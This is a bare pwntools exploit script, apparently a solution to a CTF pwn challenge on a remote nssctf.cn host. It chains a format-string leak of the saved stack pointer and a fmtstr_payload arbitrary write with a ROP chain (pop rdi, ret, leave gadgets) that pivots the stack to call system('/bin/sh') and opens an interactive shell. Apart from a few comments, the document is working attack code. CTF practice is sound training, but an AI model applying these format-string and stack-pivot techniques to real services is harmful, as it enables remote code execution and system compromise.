from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn','''
#            b main
#            b vuln
#            b *0x000000000040082D
#            ''')
#io=process('./pwn')
io=remote('node1.anna.nssctf.cn',28339)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


elf=ELF('./pwn')
system=elf.plt['system']
ret=0x0000000000400581 #: ret


prdi=0x0000000000400893 # : pop rdi ; ret
leave=0x0400758 

p1=b'%32$paaa'
#fmt_payload(,{addr:v}) 
p1+=fmtstr_payload(7,{0x6010A0:102},numbwritten=17,write_size='short')# int short byte 

ru(b'name?\n')

sl(p1)


ru(b'0x')
rbp= int(io.recv(12).rjust(16,b'0'),16)
print(hex(rbp))

ru(b'welcome,tell me more about you')

p2=b'this rbp'+p64(prdi)+p64(rbp-0x30+0x20+0x8)+p64(ret)+p64(system)+b'/bin/sh\x00'
#p2+=p2.ljust(0x40-0x10,b'a')+p64(rbp-0x30)+p64(leave)
p2+=p64(rbp-0x30)+p64(leave)

s(p2)
ru(b'Minions?')

sl(b'aaa')




ii()
